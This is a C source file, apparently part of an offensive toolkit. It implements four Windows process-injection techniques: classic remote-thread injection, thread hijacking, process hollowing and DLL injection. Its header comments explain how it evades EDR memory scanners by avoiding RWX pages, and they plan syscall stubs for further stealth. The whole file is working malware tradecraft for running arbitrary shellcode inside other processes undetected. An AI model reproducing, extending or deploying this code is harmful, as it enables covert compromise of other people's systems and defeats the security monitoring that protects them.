// Process Injection — Classic, Thread Hijack, Process Hollowing, DLL
//
// OPSEC HARDENING (audit I-CR6 fix):
//   OLD: VirtualAllocEx(PAGE_EXECUTE_READWRITE) — RWX is the #1 EDR signature.
//        Every memory scanner (Moneta, PE-sieve, Velociraptor) flags RWX regions
//        as shellcode by default. CreateRemoteThread on RWX = instant detection.
//
//   NEW: VirtualAllocEx(PAGE_READWRITE)  →  WriteProcessMemory  →
//        VirtualProtectEx(PAGE_EXECUTE_READ)  →  FlushInstructionCache
//        Two-step pattern: writable during write, executable after — never both.
//        Matches how modern .NET JIT, V8, and signed binaries load code.
//
// NOTE: use_syscalls parameter is currently wired through the Rust FFI
// signature but routes to the standard Win32 path. Future wiring to HERO
// FORGE forged stubs (sm_NtAllocateVirtualMemory / sm_NtProtectVirtualMemory
// / sm_NtWriteVirtualMemory / sm_NtCreateThreadEx) is a separate feature.
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <tlhelp32.h>

// Classic injection: VirtualAllocEx(RW) → WriteProcessMemory →
// VirtualProtectEx(RX) → FlushInstructionCache → CreateRemoteThread
int inject_classic(uint32_t pid, const uint8_t *shellcode, size_t sc_size, int use_syscalls) {
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProc) return -1;

    // Step 1: Allocate RW (NOT RWX) — EDRs flag RWX regions on sight
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); return -2; }

    // Step 2: Write shellcode while region is writable
    SIZE_T written;
    if (!WriteProcessMemory(hProc, mem, shellcode, sc_size, &written)) {
        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -3;
    }

    // Step 3: Flip protection to RX (executable, NOT writable) — never RWX
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProc, mem, sc_size, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -5;
    }
    // Step 4: Flush instruction cache so CPU sees the new code, not stale bytes
    FlushInstructionCache(hProc, mem, sc_size);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -4;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}

// Thread hijacking: allocate RW → write → flip RX → suspend → set RIP → resume
int inject_thread_hijack(uint32_t pid, uint32_t tid, const uint8_t *shellcode, size_t sc_size) {
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProc) return -1;

    // Step 1: Allocate RW (not RWX)
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); return -2; }

    // Step 2: Write shellcode while region is writable
    SIZE_T written;
    if (!WriteProcessMemory(hProc, mem, shellcode, sc_size, &written)) {
        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -3;
    }

    // Step 3: Flip protection to RX — never leave RWX behind
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProc, mem, sc_size, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -5;
    }
    FlushInstructionCache(hProc, mem, sc_size);

    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT | THREAD_GET_CONTEXT, FALSE, tid);
    if (!hThread) {
        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -4;
    }

    SuspendThread(hThread);

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    ctx.Rip = (DWORD64)mem;
    SetThreadContext(hThread, &ctx);

    ResumeThread(hThread);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}

// Process hollowing: create suspended → unmap → inject → resume
int inject_process_hollow(const uint16_t *target_exe, const uint8_t *shellcode, size_t sc_size) {
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    // Create target process in suspended state
    if (!CreateProcessW(
            NULL, (LPWSTR)target_exe, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return -1;
    }

    // Get main module base in target process
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pi.dwProcessId);
    if (hSnap == INVALID_HANDLE_VALUE) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -2;
    }

    MODULEENTRY32W me = {0};
    me.dwSize = sizeof(me);
    LPVOID base_addr = NULL;
    if (Module32FirstW(hSnap, &me)) {
        base_addr = me.modBaseAddr;
    }
    CloseHandle(hSnap);

    if (!base_addr) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -3;
    }

    // Unmap original image
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS(NTAPI *fn_NtUnmapViewOfSection)(HANDLE, PVOID);
    fn_NtUnmapViewOfSection pNtUnmap = (fn_NtUnmapViewOfSection)GetProcAddress(hNtDll, "NtUnmapViewOfSection");
    if (pNtUnmap) pNtUnmap(pi.hProcess, base_addr);

    // Allocate new memory (RW first — NOT RWX) and write shellcode
    LPVOID newMem = VirtualAllocEx(pi.hProcess, base_addr, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!newMem) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -4;
    }

    SIZE_T written;
    WriteProcessMemory(pi.hProcess, newMem, shellcode, sc_size, &written);

    // Flip protection to RX before resuming — never RWX
    DWORD oldProtect = 0;
    VirtualProtectEx(pi.hProcess, newMem, sc_size, PAGE_EXECUTE_READ, &oldProtect);
    FlushInstructionCache(pi.hProcess, newMem, sc_size);

    // Resume the suspended thread (now points to our shellcode)
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

// DLL injection via LoadLibraryA in remote thread
int inject_dll(uint32_t pid, const uint16_t *dll_path_wide, int use_syscalls) {
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProc) return -1;

    // Calculate DLL path size in bytes
    size_t path_len = 0;
    while (dll_path_wide[path_len]) path_len++;
    size_t path_bytes = (path_len + 1) * 2;

    LPVOID mem = VirtualAllocEx(hProc, NULL, path_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); return -2; }

    SIZE_T written;
    WriteProcessMemory(hProc, mem, dll_path_wide, path_bytes, &written);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, mem, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -3;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return 0;
}